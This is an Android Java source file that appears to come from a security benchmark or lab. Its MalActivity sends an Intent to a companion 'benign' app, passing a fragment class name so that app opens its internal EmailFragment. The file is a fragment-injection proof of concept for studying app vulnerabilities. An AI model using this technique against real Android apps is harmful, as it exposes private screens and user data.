package edu.ksu.cs.malicious;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;

public class MalActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_mal);
    }

    @Override
    protected void onResume() {
        super.onResume();
        Button InjectFrag = (Button) findViewById(R.id.inject_frag);
        InjectFrag.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setPackage("edu.ksu.cs.benign");
                intent.setClassName("edu.ksu.cs.benign", "edu.ksu.cs.benign.MainActivity");
                intent.putExtra("fname", "edu.ksu.cs.benign.EmailFragment");
                startActivity(intent);
            }
        });
    }
}
